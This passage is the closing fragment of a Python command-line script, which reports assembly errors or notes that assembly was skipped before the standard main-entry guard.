            for err in result.asm_errors:
                print(f"    {err}", file=sys.stderr)
    else:
        if result.asm_errors:
            print("[!] Assembly failed:")
            for err in result.asm_errors:
                print(f"    {err}")
        else:
            print("[*] Assembly skipped (no assembler available or --no-assemble)")


if __name__ == "__main__":
    main()
